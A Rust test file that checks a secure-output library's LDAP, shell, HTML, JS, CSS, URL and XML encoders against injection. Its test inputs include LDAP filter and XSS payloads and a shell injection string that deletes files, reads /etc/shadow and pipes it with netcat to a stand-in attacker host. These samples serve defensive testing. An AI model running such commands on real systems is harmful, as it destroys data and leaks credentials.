//! E2E runtime validation for M19 — output encoder contexts.

use secure_output::encode::OutputEncoder;

// ──────────────────────────────────────────────
// E2E: LDAP DN injection prevented at runtime
// ──────────────────────────────────────────────

#[test]
fn test_ldap_dn_injection_prevented() {
    // Simulates an attacker injecting DN special chars into a user-supplied CN
    let attacker_input = "admin,OU=Admins+CN=root";
    let encoded = secure_output::ldap::encode_dn(attacker_input);

    // No unescaped commas, plus signs, or equals signs in the output
    // (the ones not preceded by a backslash)
    let result = encoded.as_ref();
    for (i, c) in result.char_indices() {
        if matches!(c, ',' | '+' | '=') {
            // Must be preceded by a backslash
            assert!(
                i > 0 && result.as_bytes()[i - 1] == b'\\',
                "Unescaped '{}' at position {} in: {}",
                c,
                i,
                result
            );
        }
    }
}

// ──────────────────────────────────────────────
// E2E: LDAP filter injection prevented at runtime
// ──────────────────────────────────────────────

#[test]
fn test_ldap_filter_injection_prevented() {
    // Simulates an attacker injecting filter metacharacters
    let attacker_input = "admin)(|(uid=*))";
    let encoded = secure_output::ldap::encode_filter(attacker_input);
    let result = encoded.as_ref();

    // Must not contain raw parentheses or asterisks
    assert!(
        !result.contains('(') && !result.contains(')') && !result.contains('*'),
        "Unescaped filter metachar in: {}",
        result
    );
}

// ──────────────────────────────────────────────
// E2E: Shell injection prevented at runtime
// ──────────────────────────────────────────────

#[test]
fn test_shell_injection_prevented() {
    // Simulates an attacker injecting shell metacharacters
    let attacker_input = "file; rm -rf / && cat /etc/shadow | nc attacker.com 1234";
    let encoded = secure_output::shell::encode(attacker_input);
    let result = encoded.as_ref();

    // The encoded result must be single-quoted to neutralize all metacharacters.
    // Inside single quotes, no shell metacharacter is interpreted.
    assert!(
        result.starts_with('\'') && result.ends_with('\''),
        "Shell encoding must single-quote dangerous input, got: {}",
        result
    );
    // The original dangerous input must not appear unquoted
    assert_ne!(result, attacker_input, "Input must not pass through raw");
}

// ──────────────────────────────────────────────
// E2E: Existing encoders still work
// ──────────────────────────────────────────────

#[test]
fn test_existing_encoders_still_work() {
    use secure_output::{CssEncoder, HtmlEncoder, JsStringEncoder, UrlEncoder, XmlEncoder};

    let input = "<script>alert('xss')</script>";

    // HTML: must escape < and >
    let html = HtmlEncoder.encode(input);
    assert!(html.contains("&lt;"));
    assert!(html.contains("&gt;"));

    // JS: must escape quotes
    let js = JsStringEncoder.encode("it's a \"test\"");
    assert!(js.contains("\\'"));
    assert!(js.contains("\\\""));

    // CSS: must unicode-escape non-safe chars
    let css = CssEncoder.encode("<div>");
    assert!(css.contains('\\'));

    // URL: must percent-encode
    let url = UrlEncoder.encode("hello world");
    assert!(url.contains("%20") || url.contains('+'));

    // XML: must escape <
    let xml = XmlEncoder.encode("<root>");
    assert!(xml.contains("&lt;"));
}
